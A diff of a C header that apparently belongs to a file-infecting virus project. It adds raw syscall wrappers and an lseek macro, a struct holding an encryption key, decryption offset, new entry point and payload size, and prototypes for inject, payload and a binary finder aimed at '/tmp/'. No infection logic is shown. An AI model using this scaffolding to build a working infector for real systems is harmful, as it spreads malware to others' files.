@@ -27,6 +27,10 @@
 # define PROT_WRITE 2
 # define MAP_FAILED ((void *)-1)
 
+/* lseek */
+# define SEEK_SET 0
+# define SEEK_CUR 1
+# define SEEK_END 2
 
 /*
 # include <stdio.h>
@@ -38,44 +42,45 @@
 
 # define FORCE_INLINE __attribute__((always_inline)) inline
 
-# define WRITE(fd, buffer, len) syscall0(SYS_WRITE, fd, buffer, len)
-# define READ(fd, buffer, len) syscall0(SYS_READ, fd, buffer, len)
-# define OPEN(pathname, flags) syscall1(SYS_OPEN, pathname, flags)
-# define CLOSE(fd) syscall2(SYS_CLOSE, fd)
-# define EXIT(code) syscall2(SYS_EXIT, code)
-# define FSTAT(fildes, buf) syscall3(SYS_FSTAT, fildes, (struct stat*)buf)
-# define MMAP(addr, len, prot, flags, fildes, off) syscall6(SYS_MMAP, addr, len, prot, flags, fildes, off)
-# define MUNMAP(addr, length) syscall1(SYS_MUNMAP, addr, length)
+# define WRITE(fd, buffer, len) syscall3(SYS_WRITE, (u64)fd, (u64)buffer, (u64)len)
+# define READ(fd, buffer, len) syscall3(SYS_READ, (u64)fd, (u64)buffer, (u64)len)
+# define OPEN(pathname, flags) syscall2(SYS_OPEN, (u64)pathname, (u64)flags)
+# define FSTAT(fildes, buf) syscall2(SYS_FSTAT, (u64)fildes, (u64)buf)
+# define CLOSE(fd) syscall1(SYS_CLOSE, (u64)fd)
+# define EXIT(code) syscall1(SYS_EXIT, (u64)code)
+# define MMAP(addr, len, prot, flags, fildes, off) syscall6(SYS_MMAP, (void*)addr, (size_t)len, (int)prot, (int)flags, (int)fildes, (int)off)
+# define MUNMAP(addr, length) syscall1(SYS_MUNMAP, (u64)addr, (u64)length)
+# define LSEEK(fd, offset, whence) syscall3(SYS_LSEEK, (u64)fd, (u64)offset, (u64)whence)
 
 # define INFESTED_DIR "/tmp/"
 
-typedef struct	s_file
-{
-	char	*file;
-	size_t	len;
-}				t_file;
-
 typedef struct	s_data
 {
+	int fd;
+	int virt_addr;
 	int	key;
 	int	decrypt_start;
+	int	v_addr;
+	int new_entry;
+	int pl_size;
 }		t_data;
 
 
 /* syscalls.c */
-size_t	syscall0(int syscall, int arg1, char *arg2, size_t arg3);
-int	syscall1(int syscall, char *arg1, int arg2);
-size_t	syscall2(int syscall, int arg1);
-size_t	syscall3(int syscall, int arg1, void *arg2);
-void *syscall6(int syscall, void *arg1, size_t arg2, int arg3, int arg4, int arg5, off_t arg6);
+u64	syscall1(int syscall, u64 arg1);
+u64	syscall2(int syscall, u64 arg1, u64 arg2);
+u64	syscall3(int syscall, u64 arg1, u64 arg2, u64 arg3);
+u64 syscall6(int syscall, u64 arg1, u64 arg2, u64 arg3, u64 arg4, u64 arg5, u64 arg6);
 
 /* main.c */
-void inject(int file_fd);
 void payload(void);
 void payload_end(void);
 
+/* inject.c */
+int inject(t_data data);
+
 /* binary_finder.c */
-int finder(int fd);
+int finder(t_data data, int fd);
 
 /* lib.c */
 size_t	ft_strlen(char *str);
